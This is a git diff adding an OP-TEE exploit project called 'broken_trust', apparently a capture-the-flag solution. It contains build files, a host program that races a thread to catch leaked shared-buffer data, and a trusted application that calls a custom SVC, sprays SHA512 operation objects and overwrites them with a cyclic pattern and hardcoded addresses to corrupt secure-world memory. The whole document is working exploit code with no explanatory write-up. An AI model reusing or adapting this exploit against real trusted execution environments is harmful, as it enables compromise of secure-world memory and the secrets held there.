diff --git a/broken_trust/Android.mk b/broken_trust/Android.mk
new file mode 100644
index 0000000..1e257d0
--- /dev/null
+++ b/broken_trust/Android.mk
@@ -0,0 +1,19 @@
+###################### sas-trust-issues ######################
+LOCAL_PATH := $(call my-dir)
+
+include $(CLEAR_VARS)
+LOCAL_CFLAGS += -DANDROID_BUILD
+LOCAL_CFLAGS += -Wall
+
+LOCAL_SRC_FILES += host/main.c
+
+LOCAL_C_INCLUDES := $(LOCAL_PATH)/ta/include
+
+LOCAL_SHARED_LIBRARIES := libteec
+LOCAL_MODULE := sas_broken_trust
+LOCAL_VENDOR_MODULE := true
+LOCAL_MODULE_TAGS := optional
+
+include $(BUILD_EXECUTABLE)
+
+include $(LOCAL_PATH)/ta/Android.mk
diff --git a/broken_trust/CMakeLists.txt b/broken_trust/CMakeLists.txt
new file mode 100644
index 0000000..1b9253d
--- /dev/null
+++ b/broken_trust/CMakeLists.txt
@@ -0,0 +1,13 @@
+project(sas_broken_trust C)
+
+set(SRC host/main.c)
+
+add_executable(${PROJECT_NAME} ${SRC})
+
+target_include_directories(${PROJECT_NAME}
+	PRIVATE ta/include
+	PRIVATE include)
+
+target_link_libraries(${PROJECT_NAME} PRIVATE teec)
+
+install(TARGETS ${PROJECT_NAME} DESTINATION ${CMAKE_INSTALL_BINDIR})
diff --git a/broken_trust/Makefile b/broken_trust/Makefile
new file mode 100644
index 0000000..b188683
--- /dev/null
+++ b/broken_trust/Makefile
@@ -0,0 +1,15 @@
+export V?=0
+
+# If _HOST or _TA specific compilers are not specified, then use CROSS_COMPILE
+HOST_CROSS_COMPILE ?= $(CROSS_COMPILE)
+TA_CROSS_COMPILE ?= $(CROSS_COMPILE)
+
+.PHONY: all
+all:
+	$(MAKE) -C host CROSS_COMPILE="$(HOST_CROSS_COMPILE)" --no-builtin-variables
+	$(MAKE) -C ta CROSS_COMPILE="$(TA_CROSS_COMPILE)" LDFLAGS=""
+
+.PHONY: clean
+clean:
+	$(MAKE) -C host clean
+	$(MAKE) -C ta clean
diff --git a/broken_trust/host/Makefile b/broken_trust/host/Makefile
new file mode 100644
index 0000000..20e7781
--- /dev/null
+++ b/broken_trust/host/Makefile
@@ -0,0 +1,28 @@
+CC      ?= $(CROSS_COMPILE)gcc
+LD      ?= $(CROSS_COMPILE)ld
+AR      ?= $(CROSS_COMPILE)ar
+NM      ?= $(CROSS_COMPILE)nm
+OBJCOPY ?= $(CROSS_COMPILE)objcopy
+OBJDUMP ?= $(CROSS_COMPILE)objdump
+READELF ?= $(CROSS_COMPILE)readelf
+
+OBJS = main.o
+
+CFLAGS += -Wall -I../ta/include -I$(TEEC_EXPORT)/include -I./include
+#Add/link other required libraries here
+LDADD += -lteec -L$(TEEC_EXPORT)/lib
+
+BINARY = sas_broken_trust_exploit
+
+.PHONY: all
+all: $(BINARY)
+
+$(BINARY): $(OBJS)
+	$(CC) $(LDFLAGS) -o $@ $< $(LDADD)
+
+.PHONY: clean
+clean:
+	rm -f $(OBJS) $(BINARY)
+
+%.o: %.c
+	$(CC) $(CFLAGS) -c $< -o $@
diff --git a/broken_trust/host/main.c b/broken_trust/host/main.c
new file mode 100644
index 0000000..3a0c97d
--- /dev/null
+++ b/broken_trust/host/main.c
@@ -0,0 +1,155 @@
+#include <ctype.h>
+#include <err.h>
+#include <pthread.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+/* OP-TEE TEE client API (built by optee_client) */
+#include <tee_client_api.h>
+
+/* For the UUID (found in the TA's h-file(s)) */
+#include <broken_trust_ta.h>
+#include <unistd.h>
+
+typedef struct {
+  TEEC_Context *ctx;
+  TEEC_Session *sess;
+} TrustletSession_t;
+
+void dump_hex(const void *data, size_t size) {
+  char ascii[17];
+  size_t i, j;
+  ascii[16] = '\0';
+  for (i = 0; i < size; ++i) {
+    printf("%02X ", ((unsigned char *)data)[i]);
+    if (((unsigned char *)data)[i] >= ' ' &&
+        ((unsigned char *)data)[i] <= '~') {
+      ascii[i % 16] = ((unsigned char *)data)[i];
+    } else {
+      ascii[i % 16] = '.';
+    }
+    if ((i + 1) % 8 == 0 || i + 1 == size) {
+      printf(" ");
+      if ((i + 1) % 16 == 0) {
+        printf("|  %s \n", ascii);
+      } else if (i + 1 == size) {
+        ascii[(i + 1) % 16] = '\0';
+        if ((i + 1) % 16 <= 8) {
+          printf(" ");
+        }
+        for (j = (i + 1) % 16; j < 16; ++j) {
+          printf("   ");
+        }
+        printf("|  %s \n", ascii);
+      }
+    }
+  }
+}
+
+TrustletSession_t open_session() {
+  TEEC_Result res;
+  TEEC_Context *ctx = malloc(sizeof(TEEC_Context));
+  TEEC_Session *sess = malloc(sizeof(TEEC_Session));
+  TrustletSession_t session = {ctx, sess};
+  uint32_t err_origin;
+
+  res = TEEC_InitializeContext(NULL, ctx);
+  if (res != TEEC_SUCCESS)
+    errx(1, "TEEC_InitializeContext failed with code 0x%x", res);
+
+  const TEEC_UUID uuid = TA_BROKEN_TRUST_UUID;
+  res = TEEC_OpenSession(ctx, sess, &uuid, TEEC_LOGIN_PUBLIC, NULL, NULL,
+                         &err_origin);
+  if (res != TEEC_SUCCESS)
+    errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x", res,
+         err_origin);
+
+  return session;
+}
+
+void finalize_session(TrustletSession_t *sess) {
+  TEEC_CloseSession(sess->sess);
+  TEEC_FinalizeContext(sess->ctx);
+
+  free(sess->ctx);
+  free(sess->sess);
+}
+
+void run_command(TrustletSession_t *sess, TEEC_Operation *op) {
+  TEEC_Result res;
+  uint32_t err_origin;
+  res = TEEC_InvokeCommand(sess->sess, TA_BROKEN_TRUST_CMD_EXPLOIT, op,
+                           &err_origin);
+}
+
+// Conversion functions.
+uint32_t high_dword(const uint64_t val) { return (val >> 32) & 0xffffffffull; }
+uint32_t low_dword(const uint64_t val) { return val & 0xffffffffull; }
+
+uint64_t u64(const char *input) { return *(uint64_t *)input; }
+uint32_t u32(const char *input) { return *(uint32_t *)input; }
+
+void p64(uint64_t val, char *out_ptr) {
+  memcpy(out_ptr, &val, sizeof(uint64_t));
+}
+
+void p32(uint64_t val, char *out_ptr) {
+  memcpy(out_ptr, &val, sizeof(uint32_t));
+}
+
+#define P32(val, out_ptr)                                                      \
+  {                                                                            \
+    p32(val, out_ptr);                                                         \
+    out_ptr += sizeof(uint32_t);                                               \
+  }
+
+void *memory_reader(void *arg) {
+  char *buffer = (char *)arg;
+  while (1) {
+    if (buffer[0] != 0x43) {
+      printf("Found: %s\n", buffer);
+      break;
+    }
+  }
+  return NULL;
+}
+
+int do_exploit(void) {
+  TEEC_Operation op;
+  TrustletSession_t sess = open_session();
+
+  memset(&op, 0, sizeof(op));
+  op.paramTypes =
+      TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_MEMREF_TEMP_INOUT,
+                       TEEC_MEMREF_TEMP_INOUT, TEEC_NONE);
+
+  op.params[0].tmpref.buffer = calloc(1, 0x1000);
+  op.params[0].tmpref.size = 0x1000;
+  op.params[1].tmpref.buffer = calloc(1, 0x1000);
+  op.params[1].tmpref.size = 0x1000;
+  op.params[2].tmpref.buffer = calloc(1, 0x1000);
+  op.params[2].tmpref.size = 0x1000;
+
+  memset(op.params[0].tmpref.buffer, 0x41, op.params[0].tmpref.size);
+  memset(op.params[1].tmpref.buffer, 0x42, op.params[1].tmpref.size);
+  memset(op.params[2].tmpref.buffer, 0x43, op.params[2].tmpref.size);
+
+  // Create a thread that will try reading memory.
+  pthread_t thread;
+  pthread_create(&thread, NULL, memory_reader, op.params[2].tmpref.buffer);
+
+  // dump_hex(op.params[0].tmpref.buffer, op.params[0].tmpref.size);
+  // dump_hex(op.params[1].tmpref.buffer, op.params[1].tmpref.size);
+  run_command(&sess, &op);
+
+  // dump_hex(op.params[2].tmpref.buffer, op.params[2].tmpref.size);
+
+  // Gracefully shutdown the session.
+  finalize_session(&sess);
+
+  return 0;
+}
+
+int main(int argc, char *argv[]) { return do_exploit(); }
diff --git a/broken_trust/ta/Android.mk b/broken_trust/ta/Android.mk
new file mode 100644
index 0000000..df4bb7b
--- /dev/null
+++ b/broken_trust/ta/Android.mk
@@ -0,0 +1,4 @@
+LOCAL_PATH := $(call my-dir)
+
+local_module := 41414141-7472-7573-745f-697373756573.ta
+include $(BUILD_OPTEE_MK)
diff --git a/broken_trust/ta/Makefile b/broken_trust/ta/Makefile
new file mode 100644
index 0000000..a2fa0c5
--- /dev/null
+++ b/broken_trust/ta/Makefile
@@ -0,0 +1,13 @@
+CFG_TEE_TA_LOG_LEVEL ?= 4
+CFG_TA_OPTEE_CORE_API_COMPAT_1_1=y
+
+# The UUID for the Trusted Application
+BINARY=41414141-7472-7573-745f-697373756573
+
+-include $(TA_DEV_KIT_DIR)/mk/ta_dev_kit.mk
+
+ifeq ($(wildcard $(TA_DEV_KIT_DIR)/mk/ta_dev_kit.mk), )
+clean:
+	@echo 'Note: $$(TA_DEV_KIT_DIR)/mk/ta_dev_kit.mk not found, cannot clean TA'
+	@echo 'Note: TA_DEV_KIT_DIR=$(TA_DEV_KIT_DIR)'
+endif
diff --git a/broken_trust/ta/broken_trust_ta.c b/broken_trust/ta/broken_trust_ta.c
new file mode 100644
index 0000000..339be98
--- /dev/null
+++ b/broken_trust/ta/broken_trust_ta.c
@@ -0,0 +1,328 @@
+#include "tee_api_defines.h"
+#include "tee_api_types.h"
+#include <string.h>
+#include <tee_internal_api.h>
+#include <tee_internal_api_extensions.h>
+
+#include <broken_trust_ta.h>
+
+/*
+ * Called when the instance of the TA is created. This is the first call in
+ * the TA.
+ */
+TEE_Result TA_CreateEntryPoint(void) { return TEE_SUCCESS; }
+
+/*
+ * Called when the instance of the TA is destroyed if the TA has not
+ * crashed or panicked. This is the last call in the TA.
+ */
+void TA_DestroyEntryPoint(void) {}
+
+/*
+ * Called when a new session is opened to the TA. *sess_ctx can be updated
+ * with a value to be able to identify this session in subsequent calls to the
+ * TA. In this function you will normally do the global initialization for the
+ * TA.
+ */
+TEE_Result TA_OpenSessionEntryPoint(uint32_t param_types,
+                                    TEE_Param __maybe_unused params[4],
+                                    void __maybe_unused **sess_ctx) {
+  /* Unused parameters */
+  (void)param_types;
+  (void)&params;
+  (void)&sess_ctx;
+
+  /* If return value != TEE_SUCCESS the session will not be created. */
+  return TEE_SUCCESS;
+}
+
+/*
+ * Called when a session is closed, sess_ctx hold the value that was
+ * assigned by TA_OpenSessionEntryPoint().
+ */
+void TA_CloseSessionEntryPoint(void __maybe_unused *sess_ctx) {
+  (void)&sess_ctx; /* Unused parameter */
+}
+
+// Conversion functions.
+static uint32_t high_dword(const uint64_t val) {
+  return (val >> 32) & 0xffffffffull;
+}
+static uint32_t low_dword(const uint64_t val) { return val & 0xffffffffull; }
+
+static uint64_t u64(const char *input) { return *(uint64_t *)input; }
+static uint32_t u32(const char *input) { return *(uint32_t *)input; }
+
+static void p64(uint64_t val, char *out_ptr) {
+  memcpy(out_ptr, &val, sizeof(uint64_t));
+}
+
+static void p32(uint64_t val, char *out_ptr) {
+  memcpy(out_ptr, &val, sizeof(uint32_t));
+}
+
+#define P64(val, out_ptr)                                                      \
+  {                                                                            \
+    p64(val, out_ptr);                                                         \
+    out_ptr += sizeof(uint64_t);                                               \
+  }
+
+static TEE_Result do_svc(uint64_t op, uint64_t id, void *buf, size_t len) {
+
+  // Setup registers for SVC call
+  volatile register uint64_t x8 __asm("x8") = 0x45; // SVC number
+  volatile register uint64_t x0 __asm("x0") = op;
+  volatile register uint64_t x1 __asm("x1") = id;
+  volatile register uint64_t x2 __asm("x2") = (uint64_t)buf;
+  volatile register uint64_t x3 __asm("x3") = len;
+
+  // Call SVC
+  __asm volatile("svc #0"
+                 : "=r"(x0) // Output: x0 (return value)
+                 : "r"(x0), "r"(x1), "r"(x2), "r"(x3), // Inputs: x0, x1, x2, x3
+                   "r"(x8)                             // Inputs: x8
+                 : "memory");                          // Clobber: memory
+
+  // Copy return value to res
+  return x0;
+}
+
+static TEE_Result alloc(uint64_t id, uint64_t len) {
+  TEE_Result res = TEE_SUCCESS;
+
+  // Allocate memory
+  res = do_svc(0x1, id, NULL, len);
+  if (res != TEE_SUCCESS) {
+    EMSG("Memory allocation failed: 0x%08x", res);
+    return res;
+  }
+
+  return TEE_SUCCESS;
+}
+
+static TEE_Result free_entry(uint64_t id) {
+  TEE_Result res = TEE_SUCCESS;
+
+  res = do_svc(0x2, id, NULL, 0);
+  if (res != TEE_SUCCESS) {
+    EMSG("Memory free failed: 0x%08x", res);
+    return res;
+  }
+
+  return TEE_SUCCESS;
+}
+
+static TEE_Result write(uint64_t id, void *buf, size_t len) {
+  TEE_Result res = TEE_SUCCESS;
+
+  res = do_svc(0x3, id, buf, len);
+  if (res != TEE_SUCCESS) {
+    EMSG("Memory write failed: 0x%08x", res);
+    return res;
+  }
+
+  return TEE_SUCCESS;
+}
+
+static TEE_Result read(uint64_t id, void *buf, size_t len) {
+  TEE_Result res = TEE_SUCCESS;
+
+  res = do_svc(0x4, id, buf, len);
+  if (res != TEE_SUCCESS) {
+    EMSG("Memory read failed: 0x%08x", res);
+    return res;
+  }
+
+  return TEE_SUCCESS;
+}
+
+void dump_hex(const void *data, size_t size) {
+  char ascii[17];
+  size_t i, j;
+  ascii[16] = '\0';
+  for (i = 0; i < size; ++i) {
+    printf("%02X ", ((unsigned char *)data)[i]);
+    if (((unsigned char *)data)[i] >= ' ' &&
+        ((unsigned char *)data)[i] <= '~') {
+      ascii[i % 16] = ((unsigned char *)data)[i];
+    } else {
+      ascii[i % 16] = '.';
+    }
+    if ((i + 1) % 8 == 0 || i + 1 == size) {
+      printf(" ");
+      if ((i + 1) % 16 == 0) {
+        printf("|  %s \n", ascii);
+      } else if (i + 1 == size) {
+        ascii[(i + 1) % 16] = '\0';
+        if ((i + 1) % 16 <= 8) {
+          printf(" ");
+        }
+        for (j = (i + 1) % 16; j < 16; ++j) {
+          printf("   ");
+        }
+        printf("|  %s \n", ascii);
+      }
+    }
+  }
+}
+
+static TEE_Result do_exploit(uint32_t param_types, TEE_Param params[4]) {
+  TEE_Result res;
+
+  for (uint32_t i = 0; i < 10; i++) {
+    res = alloc(i, 0x1000);
+    if (res != TEE_SUCCESS) {
+      EMSG("SVC call failed: 0x%08x", res);
+      return res;
+    }
+
+    res = read(i, params[0].memref.buffer, params[0].memref.size);
+    if (res != TEE_SUCCESS) {
+      EMSG("SVC call failed: 0x%08x", res);
+      return res;
+    }
+
+    // res = write(i, data, 0x1000);
+    // if (res != TEE_SUCCESS) {
+    //   EMSG("SVC call failed: 0x%08x", res);
+    //   return res;
+    // }
+
+    // dump_hex(params[0].memref.buffer, params[0].memref.size);
+  }
+
+  for (uint32_t i = 0; i < 10; i++) {
+    res = free_entry(i);
+    if (res != TEE_SUCCESS) {
+      EMSG("SVC call failed: 0x%08x", res);
+      return res;
+    }
+  }
+
+  const uint32_t total_objects = 10;
+  // TEE_ObjectHandle objects[total_objects];
+  TEE_OperationHandle objects[total_objects];
+
+  IMSG("Allocating %u objects", total_objects);
+  // Allocate a bunch of file objects
+  for (uint32_t i = 0; i < total_objects; i++) {
+    // char object_id[8];
+    // snprintf(object_id, sizeof(object_id), "ID%u", i);
+    // res = TEE_CreatePersistentObject(
+    //     TEE_STORAGE_PRIVATE, object_id, sizeof(object_id),
+    //     TEE_DATA_FLAG_ACCESS_READ | TEE_DATA_FLAG_ACCESS_WRITE |
+    //         TEE_DATA_FLAG_ACCESS_WRITE_META,
+    //     TEE_HANDLE_NULL, "ZZZZ", 4, &objects[i]);
+    res =
+        TEE_AllocateOperation(&objects[i], TEE_ALG_SHA512, TEE_MODE_DIGEST, 0);
+    if (res != TEE_SUCCESS) {
+      EMSG("Object creation failed: 0x%08x", res);
+      return res;
+    }
+  }
+
+  // This data starts at: 0xe1450d0
+  char data[0x1000] =
+      "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaa"
+      "jaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaa"
+      "saaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaab"
+      "caaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaab"
+      "laaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaab"
+      "uaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaac"
+      "eaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaac"
+      "naaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaac"
+      "waaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaad"
+      "gaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaad"
+      "paaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaad"
+      "yaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaae"
+      "iaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaae"
+      "raaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaaf"
+      "baaaaaafcaaaaaafdaaaaaafeaaaaaaffaaaaaafgaaaaaafhaaaaaafiaaaaaafjaaaaaaf"
+      "kaaaaaaflaaaaaafmaaaaaafnaaaaaafoaaaaaafpaaaaaafqaaaaaafraaaaaafsaaaaaaf"
+      "taaaaaafuaaaaaafvaaaaaafwaaaaaafxaaaaaafyaaaaaafzaaaaaagbaaaaaagcaaaaaag"
+      "daaaaaageaaaaaagfaaaaaaggaaaaaaghaaaaaagiaaaaaagjaaaaaagkaaaaaaglaaaaaag"
+      "maaaaaagnaaaaaagoaaaaaagpaaaaaagqaaaaaagraaaaaagsaaaaaagtaaaaaaguaaaaaag"
+      "vaaaaaagwaaaaaagxaaaaaagyaaaaaagzaaaaaahbaaaaaahcaaaaaahdaaaaaaheaaaaaah"
+      "faaaaaahgaaaaaahhaaaaaahiaaaaaahjaaaaaahkaaaaaahlaaaaaahmaaaaaahnaaaaaah"
+      "oaaaaaahpaaaaaahqaaaaaahraaaaaahsaaaaaahtaaaaaahuaaaaaahvaaaaaahwaaaaaah"
+      "xaaaaaahyaaaaaahzaaaaaaibaaaaaaicaaaaaaidaaaaaaieaaaaaaifaaaaaaigaaaaaai"
+      "haaaaaaiiaaaaaaijaaaaaaikaaaaaailaaaaaaimaaaaaainaaaaaaioaaaaaaipaaaaaai"
+      "qaaaaaairaaaaaaisaaaaaaitaaaaaaiuaaaaaaivaaaaaaiwaaaaaaixaaaaaaiyaaaaaai"
+      "zaaaaaajbaaaaaajcaaaaaajdaaaaaajeaaaaaajfaaaaaajgaaaaaajhaaaaaajiaaaaaaj"
+      "jaaaaaajkaaaaaajlaaaaaajmaaaaaajnaaaaaajoaaaaaajpaaaaaajqaaaaaajraaaaaaj"
+      "saaaaaajtaaaaaajuaaaaaajvaaaaaajwaaaaaajxaaaaaajyaaaaaajzaaaaaakbaaaaaak"
+      "caaaaaakdaaaaaakeaaaaaakfaaaaaakgaaaaaakhaaaaaakiaaaaaakjaaaaaakkaaaaaak"
+      "laaaaaakmaaaaaaknaaaaaakoaaaaaakpaaaaaakqaaaaaakraaaaaaksaaaaaaktaaaaaak"
+      "uaaaaaakvaaaaaakwaaaaaakxaaaaaakyaaaaaakzaaaaaalbaaaaaalcaaaaaaldaaaaaal"
+      "eaaaaaalfaaaaaalgaaaaaalhaaaaaaliaaaaaaljaaaaaalkaaaaaallaaaaaalmaaaaaal"
+      "naaaaaaloaaaaaalpaaaaaalqaaaaaalraaaaaalsaaaaaaltaaaaaaluaaaaaalvaaaaaal"
+      "waaaaaalxaaaaaalyaaaaaalzaaaaaambaaaaaamcaaaaaamdaaaaaameaaaaaamfaaaaaam"
+      "gaaaaaamhaaaaaamiaaaaaamjaaaaaamkaaaaaamlaaaaaammaaaaaamnaaaaaamoaaaaaam"
+      "paaaaaamqaaaaaamraaaaaamsaaaaaamtaaaaaamuaaaaaamvaaaaaamwaaaaaamxaaaaaam"
+      "yaaaaaamzaaaaaanbaaaaaancaaaaaandaaaaaaneaaaaaanfaaaaaangaaaaaanhaaaaaan"
+      "iaaaaaanjaaaaaankaaaaaanlaaaaaanmaaaaaannaaaaaanoaaaaaanpaaaaaanqaaaaaan"
+      "raaaaaansaaaaaantaaaaaanuaaaaaanvaaaaaanwaaaaaanxaaaaaanyaaaaaanzaaaaaao"
+      "baaaaaaocaaaaaaodaaaaaaoeaaaaaaofaaaaaaogaaaaaaohaaaaaaoiaaaaaaojaaaaaao"
+      "kaaaaaaolaaaaaaomaaaaaaonaaaaaaooaaaaaaopaaaaaaoqaaaaaaoraaaaaaosaaaaaao"
+      "taaaaaaouaaaaaaovaaaaaaowaaaaaaoxaaaaaaoyaaaaaaozaaaaaapbaaaaaapcaaaaaap"
+      "daaaaaapeaaaaaapfaaaaaapgaaaaaaphaaaaaapiaaaaaapjaaaaaapkaaaaaaplaaaaaap"
+      "maaaaaapnaaaaaapoaaaaaappaaaaaapqaaaaaapraaaaaapsaaaaaaptaaaaaapuaaaaaap"
+      "vaaaaaapwaaaaaapxaaaaaapyaaaaaapzaaaaaaqbaaaaaaqcaaaaaaqdaaaaaaqeaaaaaaq"
+      "faaaaaaqgaaaaaaqhaaaaaaqiaaaaaaqjaaaaaaqkaaaaaaqlaaaaaaqmaaaaaaqnaaaaaaq"
+      "oaaaaaaqpaaaaaaqqaaaaaaqraaaaaaqsaaaaaaqtaaaaaaquaaaaaaqvaaaaaaqwaaaaaaq"
+      "xaaaaaaqyaaaaaaqzaaaaaarbaaaaaarcaaaaaardaaaaaareaaaaaarfaaaaaargaaaaaar"
+      "haaaaaariaaaaaarjaaaaaarkaaaaaarlaaaaaarmaaaaaarnaaaaaaroaaaaaarpaaaaaar"
+      "qaaaaaarraaaaaarsaaaaaartaaaaaaruaaaaaarvaaaaaarwaaaaaarxaaaaaaryaaaaaar"
+      "zaaaaaasbaaaaaascaaaaaasdaaaaaaseaaaaaasfaaaaaasgaaaaaashaaaaaasiaaaaaas"
+      "jaaaaaaskaaaaaaslaaaaaasmaaaaaasnaaaaaasoaaaaaaspaaaaaasqaaaaaasraaaaaas"
+      "saaaaaastaaaaaasuaaaaaasvaaaaaaswaaaaaasxaaaaaasyaaaaaaszaaaaaatbaaaaaat"
+      "caaaaaatdaaaaaateaaaaaatfaaaaaatgaaaaaathaaaaaatiaaaaaatjaaaaaatkaaaaaat"
+      "laaaaaatmaaaaaatnaaaaaatoaaaaaatpaaaaaatqaaaaaatraaaaaatsaaaaaattaaaaaat"
+      "uaaaaaatvaaaaaatwaaaaaatxaaaaaatyaaaaaatzaaaaaaubaaaaaaucaaaaaaudaaaaaau"
+      "eaaaaaaufaaaaaaugaaaaaauhaaaaaauiaaaaaaujaaaaaaukaaaaaaulaaaaaau";
+  for (uint32_t i = 0; i < 458; i++) {
+    // 0xE1AD4A8
+    p64(0xE1AD6FC, (data + i * 8));
+  }
+
+  for (uint32_t i = 375; i < 512; i++) {
+    // 0xe146270
+    p64(0xe145f20, (data + i * 8));
+  }
+
+  IMSG("Writing to objects");
+  for (uint32_t i = 0; i < 10; i++) {
+    res = write(i, data, 0x1000);
+    if (res != TEE_SUCCESS) {
+      EMSG("SVC call failed: 0x%08x", res);
+      return res;
+    }
+  }
+
+  // IMSG("Closing objects");
+  for (uint32_t i = 0; i < total_objects; i++) {
+    TEE_DigestUpdate(objects[i], params[2].memref.buffer, 0x100);
+    // TEE_CloseObject(objects[i]);
+    // TEE_FreeOperation(objects[i]);
+  }
+}
+
+/*
+ * Called when a TA is invoked. sess_ctx hold that value that was
+ * assigned by TA_OpenSessionEntryPoint(). The rest of the paramters
+ * comes from normal world.
+ */
+TEE_Result TA_InvokeCommandEntryPoint(void __maybe_unused *sess_ctx,
+                                      uint32_t cmd_id, uint32_t param_types,
+                                      TEE_Param params[4]) {
+  (void)&sess_ctx; /* Unused parameter */
+
+  IMSG("Received command: %u", cmd_id);
+
+  switch (cmd_id) {
+  case TA_BROKEN_TRUST_CMD_EXPLOIT:
+    return do_exploit(param_types, params);
+  default:
+    return TEE_ERROR_BAD_PARAMETERS;
+  }
+}
diff --git a/broken_trust/ta/include/broken_trust_ta.h b/broken_trust/ta/include/broken_trust_ta.h
new file mode 100644
index 0000000..bae99fe
--- /dev/null
+++ b/broken_trust/ta/include/broken_trust_ta.h
@@ -0,0 +1,14 @@
+#ifndef TA_BROKEN_TRUST_H
+#define TA_BROKEN_TRUST_H
+
+#define TA_BROKEN_TRUST_UUID                                                   \
+  {                                                                            \
+    0x41414141, 0x7472, 0x7573, {                                              \
+      0x74, 0x5f, 0x69, 0x73, 0x73, 0x75, 0x65, 0x73                           \
+    }                                                                          \
+  }
+
+/* The function IDs implemented in this TA */
+#define TA_BROKEN_TRUST_CMD_EXPLOIT 0
+
+#endif /*TA_BROKEN_TRUST_H*/
diff --git a/broken_trust/ta/sub.mk b/broken_trust/ta/sub.mk
new file mode 100644
index 0000000..da6c552
--- /dev/null
+++ b/broken_trust/ta/sub.mk
@@ -0,0 +1,5 @@
+global-incdirs-y += include
+srcs-y += broken_trust_ta.c
+
+# To remove a certain compiler flag, add a line like this
+#cflags-template_ta.c-y += -Wno-strict-prototypes
diff --git a/broken_trust/ta/user_ta_header_defines.h b/broken_trust/ta/user_ta_header_defines.h
new file mode 100644
index 0000000..bf0ddb6
--- /dev/null
+++ b/broken_trust/ta/user_ta_header_defines.h
@@ -0,0 +1,27 @@
+#ifndef USER_TA_HEADER_DEFINES_H
+#define USER_TA_HEADER_DEFINES_H
+
+/* To get the TA UUID definition */
+#include <broken_trust_ta.h>
+
+#define TA_UUID TA_BROKEN_TRUST_UUID
+
+/*
+ * TA properties: multi-instance TA, no specific attribute
+ * TA_FLAG_EXEC_DDR is meaningless but mandated.
+ */
+#define TA_FLAGS TA_FLAG_EXEC_DDR
+
+/* Provisioned stack size */
+#define TA_STACK_SIZE (8 * 1024)
+
+/* Provisioned heap size for TEE_Malloc() and friends */
+#define TA_DATA_SIZE (64 * 1024)
+
+/* The gpd.ta.version property */
+#define TA_VERSION "1.0"
+
+/* The gpd.ta.description property */
+#define TA_DESCRIPTION "Broken Trust TA"
+
+#endif /* USER_TA_HEADER_DEFINES_H */
